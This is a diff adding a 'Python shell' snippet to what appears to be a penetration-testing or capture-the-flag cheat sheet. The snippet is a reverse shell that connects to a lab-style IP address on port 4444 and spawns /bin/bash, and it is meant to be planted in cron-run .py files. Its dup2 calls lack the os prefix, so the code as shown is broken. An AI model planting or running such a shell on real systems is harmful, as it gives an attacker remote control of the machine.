@@ -73,3 +73,14 @@ wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x8
 # If getting Error opening terminal: xterm-256color.
 export TERM=xterm
 ```
+### Python shell suitable for .py file cron jobs
+```
+import socket,subprocess,os
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("10.10.14.7",4444))
+dup2(s.fileno(),0)
+dup2(s.fileno(),1)
+dup2(s.fileno(),2)
+import pty
+pty.spawn("/bin/bash")
+```
